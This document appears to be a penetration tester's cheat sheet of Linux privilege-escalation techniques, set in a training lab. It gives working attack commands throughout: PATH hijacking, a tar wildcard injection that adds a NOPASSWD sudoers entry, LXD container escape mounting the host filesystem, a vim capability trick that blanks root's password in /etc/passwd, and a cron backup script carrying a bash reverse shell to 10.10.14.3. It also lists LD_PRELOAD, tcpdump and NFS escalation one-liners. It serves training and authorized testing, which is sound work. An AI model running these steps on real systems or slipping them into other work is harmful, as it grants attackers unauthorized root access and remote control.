# Linux Privilege Escalation - Techniques

[Environmental-based Privilege Escalation](#environmental-based-privilege-escalation)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Path Abuse](#path-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Wildcard Abuse](#wildcard-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Restricted Shell Escape](#restricted-shell-escape)<br/>
[Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[System Information](#system-information)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Network Information](#network-information)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[File Systems, Drives, & Peripherals](#file-systems-drives--peripherals)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Passwords & Hashes](#passwords--hashes)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Processes](#processes)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Services, Packages, & Binaries](#services-packages--binaries)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Writable Directories & Files](#writable-directories--files)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Interesting Directories](#interesting-directories)<br/>

## Environmental-based Privilege Escalation

### Path Abuse

```text
Adding . to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as ls with a malicious script such as a reverse shell. If we add . to the path by issuing the command PATH=.:$PATH and then export PATH, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing ls will call the malicious script named ls in the current working directory instead of the binary located at /bin/ls).
``` 

```bash
env | grep PATH  # Check the PATH var contents
echo $PATH # Check the PATH var contents
```

```bash
haunter@OPFOR:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

haunter@OPFOR:~$ PATH=.:${PATH}
haunter@OPFOR:~$ export PATH
haunter@OPFOR:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

In this example, we modify the path to run a simple echo command when the command ls is typed.

haunter@OPFOR:~$ touch ls
haunter@OPFOR:~$ echo 'echo "PATH ABUSE!!"' > ls
haunter@OPFOR:~$ chmod +x ls

haunter@OPFOR:~$ ls

PATH ABUSE!!
```

### Wildcard Abuse

```text
An example of how wildcards can be abused for privilege escalation is the tar command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:

htb_student@OPFOR:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.

The --checkpoint-action option permits an EXEC action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the /home/haunter directory's contents and create a compressed archive within /home/haunter. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify. 

haunter@OPFOR:~$ echo 'echo "haunter ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
haunter@OPFOR:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
haunter@OPFOR:~$ echo "" > --checkpoint=1

We can check and see that the necessary files were created.

haunter@OPFOR:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 haunter haunter    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 haunter haunter    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 haunter haunter   60 Aug 31 23:11 root.sh

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

haunter@OPFOR:~$ sudo -l

Matching Defaults entries for haunter on OPFOR:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User haunter may run the following commands on OPFOR:
    (root) NOPASSWD: ALL

Character	Significance
*	An asterisk that can match any number of characters in a file name.
?	Matches a single character.
[ ]	Brackets enclose characters and can match any single one at the defined position.
~	A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
-	A hyphen within brackets will denote a range of characters.
```

### Restricted Shell Escape

https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/escaping-from-limited-bash

```text
Common Ristricted Shells
* rbash - most restrictive
* rksh - moderately restrictive
* rzsh - most flexible
```

#### Command Injection

```text
This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.
```

```bash
haunter@OPFOR[/attacker]$ ls -l `pwd` 
```

#### Command Substition

```text
For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.
```

#### Command Chaining

```text
We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.
```

#### Environmental Variables

```text
For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.
```

#### Shell Functions

```text
For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.
```

## Permissions-based Privilege Escalation

### Special Permissions

```text
Check GTFObins for any SUID OR SGID bins.
```

### Sudo Abuse

```bash
# Check user's sudo commands with:
sudo -l
```

```text
If any commands are listed, check the man pages for the command. Can the command execute files or other commands? Create a revshell file and run or launch a shell.
```

### Prilileged Groups

* LXC
* LXD
* ADM

LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.

  Privileged Groups
devops@OPFOR:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
Unzip the Alpine image.

  Privileged Groups
devops@OPFOR:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.

  Privileged Groups
devops@OPFOR:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
Import the local image.

  Privileged Groups
devops@OPFOR:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

  Privileged Groups
devops@OPFOR:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
Mount the host file system.

  Privileged Groups
devops@OPFOR:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type cd /mnt/root/root. From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

  Privileged Groups
devops@OPFOR:~$ lxc start r00t
devops@OPFOR:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command docker run -v /root:/mnt -it ubuntu. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.

Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

ADM
Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

  Privileged Groups
secaudit@OPFOR:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

find / -group adm -type f 2>/dev/null -print0 | xargs -0 grep flag

### Special File Capabilities

```text
Capability	Description
cap_sys_admin	Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.
cap_sys_chroot	Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.
cap_sys_ptrace	Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.
cap_sys_nice	Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.
cap_sys_time	Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.
cap_sys_resource	Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.
cap_sys_module	Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.
cap_net_bind_service	Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.
```

```text
Values	Description
=	This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.
+ep	This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.
+ei	This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.
+p	This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.
```

```text
Several Linux capabilities can be used to escalate a user's privileges to root, including:

Capability	Description
cap_setuid	Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.
cap_setgid	Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.
cap_sys_admin	This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.
cap_dac_override	Allows bypassing of file read, write, and execute permission checks.
```

```bash
getcap -r / 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

```text
If we gained access to the system with a low-privilege account, then discovered the cap_dac_override capability:
```

```bash
haunter@OPFOR[/attacker]$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
```

```text
For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo. However, because the binary has the cap_dac_override capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the cap_dac_override capability and perform tasks that require this capability.

Let us take a look at the /etc/passwd file where the user root is specified:
```

```bash
haunter@OPFOR[/attacker]$ cat /etc/passwd | head -n1
root:x:0:0:root:/root:/bin/bash
```

```text
We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
```

```bash
haunter@OPFOR[/attacker]$ /usr/bin/vim.basic /etc/passwd
```

```bash
# We also can make these changes in a non-interactive mode:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

### Cron Job Abuse

```text
Enumerate writable directories, then check the folder for interesting files being created on a set schedule to indicate a cronjob action (such as a scheduled backup). 

Use pspy to list processes and look for processes run by root UID=0 that match the directory.

Edit the script being run to include a revshell:
```

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
# revshell payload
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

### Container Abuse

We must be in either the lxc or lxd group. We can find this out with the following command:

```bash
container-user@OPFOR:~$ id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

[Sudo PrivEsc](sudo.md)

```bash
gcc kernel_expoit.c -o kernel_expoit #	Compile an exploit written in C
screen -v	# Check the installed version of Screen
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	# Priv esc with tcpdump
ldd /bin/ls	# View the shared objects required by a binary
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	# Escalate privileges using LD_PRELOAD
readelf -d payroll | grep PATH	# Check the RUNPATH of a binary
gcc src.c -fPIC -shared -o /development/libshared.so	# Compiled a shared libary
lxd init	# Start the LXD initialization process
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	# Import a local image
lxc init alpine r00t -c security.privileged=true	 # Start a privileged LXD container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true	# Mount the host file system in a container
lxc start r00t	# Start the container
showmount -e 10.129.2.12	# Show the NFS export list
sudo mount -t nfs 10.129.2.12:/tmp /mnt	# Mount an NFS share locally
tmux -S /shareds new -s debugsess	# Created a shared tmux session socket
./lynis audit system	# Perform a system audit with Lynis
```
